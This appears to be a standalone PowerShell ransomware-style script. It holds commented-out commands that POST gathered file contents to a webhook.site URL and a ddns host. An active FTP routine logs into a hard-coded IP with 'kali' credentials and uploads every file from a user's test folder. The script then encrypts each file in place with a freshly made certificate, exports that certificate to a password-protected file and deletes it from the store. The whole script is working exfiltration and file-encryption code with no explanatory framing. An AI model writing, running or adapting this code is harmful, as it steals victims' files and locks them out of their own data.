#cd "$env:DESKTOP/Lourdes/test"
#cd "C:\Users\pc\Desktop\Lourdes\test"
#powershell more -Path * > data.txt
#powershell Invoke-WebRequest -Uri https://webhook.site/1effb288-1ed1-40f4-a479-1e07b5fa764e -Method POST -InFile data.txt
#powershell Invoke-WebRequest -Uri http://projectma2022.ddns.net:443 -Method POST -InFile data.txt
echo "open 79.153.157.12" >> $home\ft1.txt
echo "kali" >> $home\ft1.txt
echo "kali" >> $home\ft1.txt
echo "ls" >> $home\ft1.txt
echo "prompt n" >> $home\ft1.txt
echo "mput C:\Users\pc\Desktop\Lourdes\test\*.*" >> $home\ft1.txt
echo "quit" >> $home\ft1.txt
ftp -s:$home\ft1.txt

$newcert='hack'

New-SelfSignedCertificate -DnsName $newcert -CertStoreLocation "Cert:\CurrentUser\My" -KeyUsage KeyEncipherment,DataEncipherment,KeyAgreement -Type DocumentEncryptionCert

$cert=Get-ChildItem -Path Cert:\CurrentUser\My\ | Where-Object subject -like "*$newcert*"
$thumb=$cert.thumbprint

$pwcert=ConvertTo-SecureString -String ('hackerman') -Force -AsPlainText

Export-PfxCertificate -Cert Cert:\CurrentUser\My\$thumb -FilePath $home\"cert_"$env:username".pfx" -Password $pwcert 

$path= get-childitem -path "C:\Users\pc\Desktop\Lourdes\test\*"
foreach ($file in $path)
    {	
	Get-Content $file | Protect-CmsMessage -To $cert.Subject -OutFile $file
    }

Get-ChildItem -Path Cert:\CurrentUser\My\ | Where-Object subject -like "*$newcert*" | Remove-Item
